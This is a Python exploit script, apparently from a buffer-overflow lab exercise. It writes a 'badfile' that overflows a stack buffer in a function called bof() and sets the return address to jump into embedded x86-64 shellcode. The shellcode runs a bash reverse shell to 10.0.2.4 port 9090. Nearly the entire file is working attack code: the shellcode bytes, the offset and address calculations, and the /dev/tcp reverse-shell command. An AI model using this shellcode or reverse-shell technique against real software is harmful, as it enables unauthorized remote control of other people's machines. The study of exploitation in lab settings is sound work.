#!/usr/bin/python3
import sys

shellcode = (
   "\xeb\x36\x5b\x48\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x48"
   "\x89\x5b\x48\x48\x8d\x4b\x0a\x48\x89\x4b\x50\x48\x8d\x4b\x0d\x48"
   "\x89\x4b\x58\x48\x89\x43\x60\x48\x89\xdf\x48\x8d\x73\x48\x48\x31"
   "\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xc5\xff\xff\xff"
   "/bin/bash*"
   "-c*"
   # The * in this line serves as the position marker         * 
   "/bin/bash -i > /dev/tcp/10.0.2.4/9090 0<&1 2>&1           *"
   "AAAAAAAA"   # Placeholder for argv[0] --> "/bin/bash"
   "BBBBBBBB"   # Placeholder for argv[1] --> "-c"
   "CCCCCCCC"   # Placeholder for argv[2] --> the command string
   "DDDDDDDD"   # Placeholder for argv[3] --> NULL
).encode('latin-1')


# Frame Pointer (rbp) inside bof():  0x00007fffffffe230
# => return address will be at 0x00007fffffffe230 + 8
# first address we can jump to is 0x00007fffffffe230 + 16
# Buffer's address inside bof():     0x00007fffffffe160
# 0x00007fffffffe230 - 0x00007fffffffe160 = 208

# Fill the content with NOP's
content = bytearray(0x90 for i in range(517)) 

# Put the shellcode at the end of the payload
start = 8
content[start:start + len(shellcode)] = shellcode

# Desired return address value 
ret    = 0x00007fffffffe160
offset = 216

# Use 4 for 32-bit address and 8 for 64-bit address
# Spraying desired return address in the first 320 bytes of badfile
content[offset:offset + 8] = (ret).to_bytes(8,byteorder='little') 

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)
